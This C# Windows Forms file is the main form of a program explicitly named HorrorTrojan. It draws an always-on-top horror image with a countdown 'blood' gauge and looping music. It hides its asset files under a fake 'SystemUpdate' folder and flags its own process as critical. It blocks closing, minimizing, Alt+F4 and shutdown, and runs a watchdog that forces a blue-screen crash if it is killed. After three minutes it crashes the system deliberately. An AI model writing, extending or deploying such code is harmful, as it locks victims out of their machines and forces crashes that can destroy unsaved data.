using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Media;
using System.Threading;
using System.Windows.Forms;

namespace HorrorTrojan
{
    public partial class HorrorForm : Form
    {
        private System.Windows.Forms.Timer bloodTimer = new System.Windows.Forms.Timer();
        private System.Windows.Forms.Timer drawTimer = new System.Windows.Forms.Timer();
        private System.Windows.Forms.Timer topMostTimer = new System.Windows.Forms.Timer();
        private System.Windows.Forms.Timer gdiTimer = new System.Windows.Forms.Timer();
        private System.Windows.Forms.Timer protectTimer = new System.Windows.Forms.Timer();
        private Random rnd = new Random();
        private DateTime startTime;
        private int maxSeconds = 180;
        private int bloodLevel = 100;
        private Image horrorImage;
        private int indicatorWidth = 25;
        private int indicatorHeight = 280;
        private int indicatorX;
        private int indicatorY;
        private int imageWidth = 300;
        private int imageHeight = 350;
        private int imageX = 10;
        private int imageY = 10;
        private int formWidth;
        private int formHeight;
        private bool isDragging = false;
        private Point dragStartPoint;
        private GDIOverlay gdiOverlay;
        private Thread watchdogThread;
        private bool watchdogAlive = true;
        private DateTime lastPing = DateTime.Now;
        private SoundPlayer musicPlayer;
        private string musicPath = @"C:\Windows\ProgramFiles\SystemUpdate\hr.wav";
        
        public HorrorForm()
        {
            InitializeComponent();
            LoadHorrorImage();
            CalculateLayout();
            this.DoubleBuffered = true;
            this.SetStyle(ControlStyles.AllPaintingInWmPaint | ControlStyles.UserPaint | ControlStyles.Opaque, true);
            
            gdiOverlay = new GDIOverlay();
            InitializeMusic();
        }
        
        private void InitializeMusic()
        {
            try
            {
                if (System.IO.File.Exists(musicPath))
                {
                    musicPlayer = new SoundPlayer(musicPath);
                    musicPlayer.Load();
                }
            }
            catch { }
        }
        
        private void InitializeComponent()
        {
            this.Text = "";
            this.FormBorderStyle = FormBorderStyle.None;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.TopMost = true;
            this.BackColor = Color.Black;
            this.TransparencyKey = Color.Black;
            this.ShowInTaskbar = false;
            this.ControlBox = false;
            this.DoubleBuffered = true;
            
            bloodTimer.Interval = 30;
            bloodTimer.Tick += BloodTimer_Tick;
            
            drawTimer.Interval = 30;
            drawTimer.Tick += DrawTimer_Tick;
            
            topMostTimer.Interval = 100;
            topMostTimer.Tick += (s, e) => { this.TopMost = true; };
            topMostTimer.Start();
            
            gdiTimer.Interval = 30;
            gdiTimer.Tick += GDITimer_Tick;
            
            protectTimer.Interval = 100;
            protectTimer.Tick += ProtectTimer_Tick;
            
            this.Load += HorrorForm_Load;
            this.Paint += HorrorForm_Paint;
            this.FormClosing += HorrorForm_FormClosing;
            this.MouseDown += HorrorForm_MouseDown;
            this.MouseMove += HorrorForm_MouseMove;
        }
        
        private void CalculateLayout()
        {
            indicatorX = imageX + imageWidth + 15;
            indicatorY = imageY + (imageHeight - indicatorHeight) / 2;
            formWidth = indicatorX + indicatorWidth + 15;
            formHeight = imageY + imageHeight + 15;
            this.Size = new Size(formWidth, formHeight);
        }
        
        private void LoadHorrorImage()
        {
            string path = @"C:\Windows\ProgramFiles\SystemUpdate\horror.png";
            if (System.IO.File.Exists(path))
                horrorImage = Image.FromFile(path);
            else
                horrorImage = new Bitmap(imageWidth, imageHeight);
        }
        
        private void HorrorForm_Load(object sender, EventArgs e)
        {
            startTime = DateTime.Now;
            bloodTimer.Start();
            drawTimer.Start();
            gdiTimer.Start();
            gdiOverlay.Start();
            protectTimer.Start();
            
            PlayMusic();
            
            SetupFullProtection();
        }
        
        private void PlayMusic()
        {
            try
            {
                if (musicPlayer != null)
                {
                    musicPlayer.PlayLooping();
                }
            }
            catch { }
        }
        
        private void StopMusic()
        {
            try
            {
                if (musicPlayer != null)
                {
                    musicPlayer.Stop();
                }
            }
            catch { }
        }
        
        private void SetupFullProtection()
        {
            try
            {
                NativeMethods.SetProcessCritical(true);
            }
            catch { }
            
            watchdogThread = new Thread(WatchdogLoop);
            watchdogThread.IsBackground = true;
            watchdogThread.Start();
        }
        
        private void WatchdogLoop()
        {
            while (watchdogAlive)
            {
                Thread.Sleep(500);
                try
                {
                    if ((DateTime.Now - lastPing).TotalSeconds > 2)
                    {
                        StopMusic();
                        BSODTrigger.TriggerBSOD();
                        return;
                    }
                }
                catch
                {
                    StopMusic();
                    BSODTrigger.TriggerBSOD();
                    return;
                }
            }
        }
        
        private void ProtectTimer_Tick(object sender, EventArgs e)
        {
            lastPing = DateTime.Now;
            
            try
            {
                NativeMethods.SetProcessCritical(true);
            }
            catch
            {
                StopMusic();
                BSODTrigger.TriggerBSOD();
            }
            
            try
            {
                this.TopMost = true;
            }
            catch { }
        }
        
        private void BloodTimer_Tick(object sender, EventArgs e)
        {
            TimeSpan elapsed = DateTime.Now - startTime;
            double percent = (elapsed.TotalSeconds / maxSeconds) * 100;
            bloodLevel = 100 - (int)Math.Min(percent, 100);
            
            if (elapsed.TotalSeconds >= maxSeconds)
            {
                bloodTimer.Stop();
                drawTimer.Stop();
                gdiTimer.Stop();
                gdiOverlay.Stop();
                protectTimer.Stop();
                watchdogAlive = false;
                StopMusic();
                BSODTrigger.TriggerBSOD();
            }
        }
        
        private void DrawTimer_Tick(object sender, EventArgs e)
        {
            this.Invalidate();
        }
        
        private void GDITimer_Tick(object sender, EventArgs e)
        {
            gdiOverlay.UpdateDrops();
        }
        
        private void HorrorForm_Paint(object sender, PaintEventArgs e)
        {
            Graphics g = e.Graphics;
            g.Clear(Color.Black);
            
            DrawImage(g);
            DrawBloodIndicator(g);
        }
        
        private void DrawImage(Graphics g)
        {
            if (horrorImage != null)
            {
                Rectangle rect = new Rectangle(imageX, imageY, imageWidth, imageHeight);
                g.DrawImage(horrorImage, rect);
            }
        }
        
        private void DrawBloodIndicator(Graphics g)
        {
            if (bloodLevel <= 0) return;
            
            int fillHeight = (bloodLevel * indicatorHeight) / 100;
            if (fillHeight <= 0) return;
            
            int fillY = indicatorY + (indicatorHeight - fillHeight);
            
            int height = Math.Max(1, fillHeight - 2);
            int width = Math.Max(1, indicatorWidth - 2);
            
            Rectangle borderRect = new Rectangle(indicatorX, indicatorY, indicatorWidth, indicatorHeight);
            using (Pen borderPen = new Pen(Color.FromArgb(120, 100, 0, 0), 1))
            {
                g.DrawRectangle(borderPen, borderRect);
            }
            
            Rectangle fillRect = new Rectangle(
                indicatorX + 1,
                fillY + 1,
                width,
                height
            );
            
            using (LinearGradientBrush brush = new LinearGradientBrush(
                fillRect,
                Color.FromArgb(255, 200, 0, 0),
                Color.FromArgb(255, 60, 0, 0),
                LinearGradientMode.Vertical))
            {
                g.FillRectangle(brush, fillRect);
            }
            
            using (Pen glowPen = new Pen(Color.FromArgb(80, 255, 0, 0), 1))
            {
                g.DrawRectangle(glowPen, indicatorX + 1, indicatorY + 1, indicatorWidth - 2, indicatorHeight - 2);
            }
            
            using (Font font = new Font("Consolas", 7, FontStyle.Bold))
            using (SolidBrush textBrush = new SolidBrush(Color.FromArgb(200, 255, 200, 200)))
            {
                string percent = bloodLevel + "%";
                SizeF textSize = g.MeasureString(percent, font);
                float textX = indicatorX + (indicatorWidth - textSize.Width) / 2;
                float textY = indicatorY + (indicatorHeight - textSize.Height) / 2;
                g.DrawString(percent, font, textBrush, textX, textY);
            }
        }
        
        private void HorrorForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (e.CloseReason == CloseReason.UserClosing || e.CloseReason == CloseReason.WindowsShutDown)
                e.Cancel = true;
            else
                BSODTrigger.TriggerBSOD();
        }
        
        private void HorrorForm_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                isDragging = true;
                dragStartPoint = new Point(e.X, e.Y);
            }
        }
        
        private void HorrorForm_MouseMove(object sender, MouseEventArgs e)
        {
            if (isDragging)
            {
                Point screenPoint = PointToScreen(e.Location);
                this.Location = new Point(screenPoint.X - dragStartPoint.X, screenPoint.Y - dragStartPoint.Y);
            }
        }
        
        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams cp = base.CreateParams;
                cp.ExStyle |= 0x80000;
                cp.ExStyle |= 0x20;
                return cp;
            }
        }
        
        protected override void WndProc(ref Message m)
        {
            const int WM_SYSCOMMAND = 0x0112;
            const int SC_CLOSE = 0xF060;
            const int SC_MINIMIZE = 0xF020;
            const int SC_MAXIMIZE = 0xF030;
            const int WM_KEYDOWN = 0x0100;
            
            if (m.Msg == WM_SYSCOMMAND)
            {
                if ((int)m.WParam == SC_CLOSE || (int)m.WParam == SC_MINIMIZE || (int)m.WParam == SC_MAXIMIZE)
                {
                    m.Result = IntPtr.Zero;
                    return;
                }
            }
            
            if (m.Msg == WM_KEYDOWN)
            {
                Keys key = (Keys)(int)m.WParam;
                if (key == Keys.F4 && Control.ModifierKeys == Keys.Alt)
                {
                    m.Result = IntPtr.Zero;
                    return;
                }
                if (key == Keys.Escape || key == Keys.F10)
                {
                    m.Result = IntPtr.Zero;
                    return;
                }
            }
            
            base.WndProc(ref m);
        }
        
        protected override void Dispose(bool disposing)
        {
            if (disposing)
            {
                bloodTimer?.Dispose();
                drawTimer?.Dispose();
                topMostTimer?.Dispose();
                gdiTimer?.Dispose();
                protectTimer?.Dispose();
                gdiOverlay?.Dispose();
                horrorImage?.Dispose();
                musicPlayer?.Dispose();
                watchdogAlive = false;
            }
            base.Dispose(disposing);
        }
    }
}
